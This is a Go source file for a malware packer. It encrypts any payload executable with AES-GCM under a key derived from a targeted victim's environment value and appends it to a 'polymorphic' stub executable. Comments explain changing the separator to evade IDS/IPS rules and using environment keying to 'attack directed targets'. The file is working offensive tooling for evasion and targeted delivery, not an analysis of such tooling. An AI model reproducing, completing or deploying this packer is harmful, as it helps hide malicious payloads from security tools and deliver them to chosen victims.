package main

import (
	"io/ioutil"
	"os"
	"path"
	"crypto/aes"
	"crypto/cipher"
	//"io"
	"log"
	"fmt"
	//"crypto/rand"
	"crypto/sha512"
	"bytes"
	"path/filepath"
	"io"
	"crypto/rand"
)
//User can edit this separator string to avoid detection by it (IDS/IPS rule for example).
// Anything can be set as long as it isn't too short or common inside a binary file
// IMPORTANT! For this program to work both programs MUST have SAME spearator string value
var separatorString = []byte("-------***------")

func getExecutableBytes() (pureExeBytes []byte){
	executablePath, err := os.Executable()
	if err != nil {
		log.Fatalf("Failed getting this program's name! - details: %s", err)
	}
	folderPath := filepath.Dir(executablePath)

	exPath := folderPath+"\\polymorphicOne.exe"
	b, err := ioutil.ReadFile(exPath)
	if err != nil{
		panic(err)
	}

	//First we have to find first separatorstring appearance in binary file - not the one we want
	// it's there because it's a staticly declared variable
	// The second one is appended by us and That is what we're looking for.
	//After that we cut off the payload and get clean executable
	numberOfSeparators := bytes.Count(b, separatorString)
	if numberOfSeparators < 2 {
		pureExeBytes, err = ioutil.ReadFile(exPath)
		if err!=nil{
			fmt.Printf("Error loading a file - details: %s", err)
		}
	} else {
		position := bytes.Index(b, separatorString)
		slicedExe := b[position+len(separatorString):]
		secondPosition :=bytes.Index(slicedExe, separatorString)
		lengthOfCut := position + secondPosition + len(separatorString)
		pureExeBytes = b[:lengthOfCut]
	}

	return pureExeBytes
}
func encrypt(key []byte, nonce []byte, plaintext []byte) ([]byte, []byte){
	// The key argument should be the AES key, either 16 or 32 bytes to select AES-128 or AES-256.
	block, err := aes.NewCipher(key)

	if err != nil {
		panic(err.Error())
	}

	aesgcm, err := cipher.NewGCM(block)

	if err != nil {
		panic(err.Error())
	}

	ciphertext := aesgcm.Seal(nil, nonce, plaintext, nil)
	//fmt.Printf("%x - nonce encrypt\n", nonce)
	//fmt.Printf("%x - key - encrypt\n", key)
	//fmt.Printf("%x - ciphertext encrypt\n\n", ciphertext)
	return ciphertext, nonce
}

func generateRandomKey(purePayload []byte) (key []byte) {
	//User has to set this variable MANUALLY to be the VALUE of ENV variable that is being targeted
	//Environmental variables allow the user to attack directed targets
	environmentalVar :="\\Users\\erdel"
	sha_env := sha512.New()
	sha_env.Write([]byte(environmentalVar))

	shaHashEnvironemntalVar := sha_env.Sum(nil)

	sha_pay := sha512.New()
	sha_pay.Write(purePayload)
	shaHashPayload := sha_pay.Sum(nil)

	combined := append(shaHashEnvironemntalVar,shaHashPayload ...)

	sha_comb := sha512.New()
	sha_comb.Write(combined)
	shaHashCombined := sha_comb.Sum(nil)

	//fmt.Printf("env hash: %s\n",shaHashEnvironemntalVar)
	//fmt.Printf("payload hash: %s\n",shaHashPayload)
	//fmt.Printf("combined hash: %s\n",shaHashCombined)

	key = shaHashCombined[:32]
	//fmt.Printf("Key: %s\n",key)
	return key
}
func generateNonce() (nonce []byte){
	nonce = []byte("123456789101")

	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
		panic(err.Error())
	}
	//fmt.Printf("Nonce: %s\n", nonce)
	return nonce
}

func appendFile( filename string, message []byte) {
	file, err := os.OpenFile(filename, os.O_WRONLY|os.O_APPEND, 0644)
	if err != nil {
		log.Fatalf("failed opening file: %s", err)
	}
	defer file.Close()

	_, err = file.Write(separatorString)
	if err != nil {
		log.Fatalf("failed writing separator to file: %s", err)
	}
	_, err = file.Write(message)
	if err != nil {
		log.Fatalf("failed writing message to file: %s", err)
	}
}
func rewriteFile(filename string, message []byte){
	err := ioutil.WriteFile(filename, message, 0644)
	if err != nil{
		fmt.Println(err)
	}
}

func main() {
	//User can modify these variables to set the default payload location/name or output file name
	defaultPayloadName := "E:\\payload.exe"
	defaultOutputName := "polymorphicOne.exe"

	pureExecutable := getExecutableBytes()
	key := generateRandomKey(pureExecutable)
	nonce := generateNonce()
	separatorString = append(separatorString,nonce...)

	//allows user to specify payload name
	var parsedPayloadLocation string
	var parsedPackerName string
	if len(os.Args)>1{
		parsedPayloadLocation = os.Args[1]
		if len(os.Args)>2{
			parsedPackerName = os.Args[2]
		}
	} else{
		parsedPayloadLocation = defaultPayloadName
		parsedPackerName = defaultOutputName
	}
	unencryptedPayload, err := ioutil.ReadFile(parsedPayloadLocation)
	if err != nil{
		fmt.Printf("No payload specified by filename - either check arguments or default config name")
		panic(err)
	}
	executable, _  := encrypt(key, nonce, unencryptedPayload)

	currentDir, err := os.Executable()
	folderPath := path.Dir(currentDir)

	filePath := folderPath+"\\"+ parsedPackerName
	rewriteFile(filePath, pureExecutable)
	appendFile(filePath,executable)
	fmt.Printf("Payload succesfuly added to: %s\n",parsedPackerName)
}
